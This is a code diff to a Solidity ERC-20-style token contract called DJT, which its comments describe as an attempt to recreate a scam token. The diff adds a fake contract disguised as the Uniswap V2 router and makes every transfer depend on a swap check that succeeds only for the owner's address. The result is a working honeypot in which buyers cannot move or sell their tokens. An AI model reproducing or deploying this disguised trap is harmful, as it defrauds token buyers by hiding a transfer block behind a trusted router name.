@@ -1,6 +1,38 @@
 // SPDX-License-Identifier: MIT 
 pragma solidity ^0.8.1;
 
+contract IUniswapV2Router02 {
+    address public owner;
+
+    constructor(address _owner) {
+        owner = _owner;
+    }
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "caller is not the owner");
+        _;
+    }
+
+    function getOwner() external pure returns(bool) {
+        // revert("12234Error messageHuh");
+        return true;
+    }
+
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external returns(bool) {
+        if (path[0] != owner) {
+            return false;
+        } else {
+            return true;
+        }
+    }
+}
+
 contract DJT {
     // In this project I'm trying to recreate scum token
     // Scum token reference - basescan.org/token/0xb7605fea8b810e39e8901f91b71f41760138d5da#code
@@ -15,8 +47,8 @@ contract DJT {
     uint public decimals = 18;
     uint public feeRate = 1;
     
-    // this is fake uniswap router, actual function is above
-    // IUniswapV2Router02 uniswapRouter;
+    // this is fake uniswap router, actual class is above
+    IUniswapV2Router02 uniswapRouter;
 
     // global counters
     mapping(address => uint) public balances;
@@ -30,11 +62,16 @@ contract DJT {
         // tx.origin - wallet who pay the fee
         // msg.sender - wallet or contrqact who sign the message
         balances[tx.origin] = totalSupply;                  // the dude who sign a message got a 23 * 10 ** 26 SCUMDJT token
-        // uniswapRouter = IUniswapV2Router02(msg.sender);     // create class above structure with BLACK list (or white list, idk, I won't change the comments late)
+        uniswapRouter = IUniswapV2Router02(msg.sender);     // create class above structure with BLACK list (or white list, idk, I won't change the comments late)
     }
     
     function balanceOf(address owner) view  public returns(uint) {
         return balances[owner];
+    }
+
+    function gtown() view public returns (bool) {
+        bool res = uniswapRouter.getOwner();
+        return res;
     }
     
     function transfer(address to, uint value) public returns(bool) {
@@ -45,13 +82,13 @@ contract DJT {
         address[] memory path = new address[](2);
         path[0] = msg.sender;
         path[1] = to;
-        // uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
-        //     fee,
-        //     value,
-        //     path,
-        //     msg.sender,
-        //     (block.timestamp + 300)
-        // );
+        require(uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            fee,
+            value,
+            path,
+            msg.sender,
+            (block.timestamp + 300)
+        ));
         emit Transfer(msg.sender, to, value);
         return true;
     }
@@ -74,8 +111,7 @@ contract DJT {
         // );
         emit Transfer(from, to, value);
         return true;   
-    }
-    
+    }    
     function approve(address spender, uint value) public returns (bool) {
         allowance[msg.sender][spender] = value;
         emit Approval(msg.sender, spender, value);
